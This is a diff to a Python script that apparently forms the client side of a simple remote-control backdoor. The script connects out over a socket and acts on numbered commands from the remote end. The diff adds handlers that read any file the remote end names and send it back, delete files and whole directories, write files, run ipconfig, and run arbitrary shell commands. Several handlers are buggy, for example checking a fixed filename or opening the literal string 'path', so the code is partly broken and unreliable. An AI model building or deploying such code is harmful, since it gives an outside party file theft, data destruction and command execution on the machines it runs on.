@@ -1,4 +1,5 @@
 import os
+import shutil
 import socket
 
 s = socket.socket()
@@ -28,8 +29,58 @@ while 1:
         print("cus dir sent done* ")
 
     elif command == "3":
-        conn.send(command.encode())
-        print("")
+        filePath = s.recv(50000)
+        filePath.decode()
+        file = open(filePath, "rb")
+        data = file.read()
+        s.send(data)
+        print("File has been sent :) ")
+
+
+    elif command == "4":
+        # delete file
+        path = s.recv(50000).decode()
+        if os.path.exists("demofile.txt"):
+            os.remove(path)
+            s.send("Done*".encode())
+        else:
+            s.send("Failed*".encode())
+
+    elif command == "5":
+        # delete Dir
+        path = s.recv(50000).decode()
+        shutil.rmtree(path)
+        s.send("Done*".encode())
+
+    elif command == "6":
+        # make File
+        path = s.recv(50000).decode()
+        f = open("path", "w")
+        contant = s.recv(500000).decode()
+        f.write(str(contant))
+        s.send("Done*".encode())
+
+
+
+    elif command == "7":
+        string = os.system("ipconfig")
+        s.send("results of ipconfig******".encode())
+
+
+    elif command == "8":
+        tar = s.recv(50000).decode()  # taskkill /IM notepad.exe
+        try:
+            os.system(str(tar))
+            s.send("done :)".encode())
+        except:
+            s.send("bad command".encode())
+
+
+    elif command == "9":
+        # https://stackoverflow.com/a/40319875
+        os.system("echo Hello W0rld")
 
     else:
         print("Command not recongnised")
+
+    print("")
